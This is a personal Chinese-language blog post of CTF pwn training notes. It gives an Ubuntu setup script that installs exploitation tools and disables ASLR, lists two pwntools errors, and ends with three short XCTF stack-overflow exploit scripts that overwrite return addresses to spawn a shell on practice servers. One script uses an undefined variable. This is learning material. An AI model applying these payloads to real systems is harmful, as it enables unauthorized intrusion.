---

title: CTF训练心得(working)
date: 2020-09-02 0:00:00
description: 随时补充
categories:

 - ctf

---
# CTF训练心得
by AdamZhang
## 环境配置
事先准备好ubuntu16.04LTS(搞pwn目前还是用16.04最好)。默认是在虚拟机环境下配置。可选虚拟机有VMware Workstation和virtualbox。virtualbox下的共享文件夹爆出了玄学问题(共享文件夹出现在了root组)。最终我选择了前者。前者的共享文件夹默认是挂载在/mnt/hgfs中，所以可以添加一个快捷方式。

```bash
#ln -s [绝对路径] ~/桌面/Name
sudo ln -s /mnt/hgfs/DataShare4Linux/ ~/Desktop/share
```
下载好的镜像在安装后需要配置源，安装一系列工具。为了方便，可利用脚本解决。
``` bash
#! /bin/bash
cp /etc/apt/sources.list /etc/apt/sources.list.bak
echo """deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse""" > /etc/apt/sources.list
dpkg --add-architecture i386
apt-get update && apt-get -y upgrade


apt-get install -y \
sudo \
build-essential \
gcc-multilib \
g++-multilib \
gdb \
gdb-multiarch \
python-dev \
python-pip \
python3-pip \
default-jdk \
net-tools \
nasm \
cmake \
ruby \
vim \
tmux \
git \
binwalk \
strace \
ltrace \
autoconf \
socat \
netcat \
nmap \
wget \
tcpdump \
libimage-exiftool-perl \
squashfs-tools \
unzip \
upx-ucl \
man-db \
manpages-dev \
libtool-bin \
bison \
libini-config-dev \
libssl-dev \
libffi-dev \
libglib2.0-dev \
libc6:i386 \
libncurses5:i386 \
libstdc++6:i386 \
lib32z1 \
xinetd \
curl \
ipython \
zsh \
openssh-server

apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
apt-get -y autoremove
#peda
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
#若安装了pwntools则不需要再安装checksec
#git clone https://github.com/slimm609/checksec.sh.git
#cd checksec.sh
#sudo ln –sf checksec /usr/bin/checksec
/etc/init.d/ssh restart
python -m pip install \
pycipher \
uncompyle \
ropgadget \
distorm3 \
filebytes \
r2pipe \
scapy \
python-constraint
python -m pip install --upgrade pwntools
python3 -m pip install setuptools \
ipython
mv /usr/local/bin/ipython /usr/local/bin/ipython3
gem install one_gadget
git clone https://github.com/sashs/Ropper.git /opt/ropper && \
cd /opt/ropper && \
python3 setup.py install
rm -rf /opt/ropper
git clone https://github.com/pwndbg/pwndbg.git /opt/pwndbg && \
cd /opt/pwndbg && \
./setup.sh
git clone git://github.com/wting/autojump.git && \
cd autojump && \
./install.py
echo "[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] && source ~/.autojump/etc/profile.d/autojump.sh" >> ~/.zshrc
echo "[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] && source ~/.autojump/etc/profile.d/autojump.sh" >> ~/.bashrc
# disable ASLR
bash -c 'echo "kernel.randomize_va_space = 0" > /etc/sysctl.d/01-disable-aslr.conf'
```
若是在windows下编辑的脚本，则需要删除回车导致每行多余的“\r”
```bash
sed -i 's/\r$//' XXX.sh
```
## 遇见的错误
### checksec出错
```py
(base) zhw@ubuntu:~/Desktop/share$ checksec level0
Traceback (most recent call last):
  File "/usr/local/bin/checksec", line 11, in <module>
    sys.exit(main())
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/commandline/common.py", line 29, in main
    import pwnlib.commandline.main
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/commandline/main.py", line 21, in <module>
    from pwnlib.commandline import template
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/commandline/template.py", line 10, in <module>
    from mako.lookup import TemplateLookup
  File "/usr/local/lib/python2.7/dist-packages/mako/lookup.py", line 12, in <module>
    from mako import exceptions
  File "/usr/local/lib/python2.7/dist-packages/mako/exceptions.py", line 305, in <module>
    _install_highlighting()
  File "/usr/local/lib/python2.7/dist-packages/mako/exceptions.py", line 300, in _install_highlighting
    _install_pygments()
  File "/usr/local/lib/python2.7/dist-packages/mako/exceptions.py", line 284, in _install_pygments
    from mako.ext.pygmentplugin import syntax_highlight  # noqa
  File "/usr/local/lib/python2.7/dist-packages/mako/ext/pygmentplugin.py", line 8, in <module>
    from pygments.formatters.html import HtmlFormatter
  File "/usr/local/lib/python2.7/dist-packages/pygments/formatters/html.py", line 554
    file=sys.stderr)
        ^
SyntaxError: invalid syntax
```
### pwntools子模块出错
```py
Traceback (most recent call last):
  File "level2.py", line 2, in <module>
    sys_addr = elf.symbol['system']
AttributeError: 'module' object has no attribute 'symbol'

```
## XCTF
### when_did_you_born
简单栈溢出

exp
``` py
from pwn import *

# v4 -20h
# v5 -18h

payload = 'a'*0x8 + str(p64(1926))

r = remote("220.249.52.133", 30943)
r.recvuntil("Birth?")
r.sendline("2000")
r.recvuntil("Name?")
r.sendline(payload)

r.interactive()
 
```
### level0
exp
```py
from pwn import *

r = remote("220.249.52.133",37998)
payload = 'a'*0x88 + p64(0x400596)
r.send(payload)
r.interactive()

```
### level2
exp
```py
from pwn import *
sys_addr = elf.symbols['system']
sh_addr = elf.search('/bin/sh').next()
payload = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) +p32(sh_addr)
r = remote("220.249.52.133",36637)
r.sendlineafter("Input:\n",payload)
r.interactive()
```
###
